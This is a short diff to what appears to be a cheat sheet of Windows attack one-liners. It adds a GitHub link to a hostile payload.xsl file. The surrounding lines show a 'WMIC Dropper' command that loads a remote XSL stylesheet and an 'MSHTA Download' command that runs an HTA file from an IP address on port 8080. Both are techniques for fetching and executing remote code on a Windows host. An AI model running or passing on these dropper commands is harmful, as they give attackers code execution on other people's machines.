@@ -16,7 +16,7 @@ WMIC Dropper
 <pre><code>wmic os get /format:"https://webserver/payload.xsl"</pre></code>
 
 payload.xsl :
-
+https://raw.githubusercontent.com/trickster0/Windows_OneLiners/master/payload.xsl
 
 MSHTA Download
 <pre><code>mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta</pre></code>
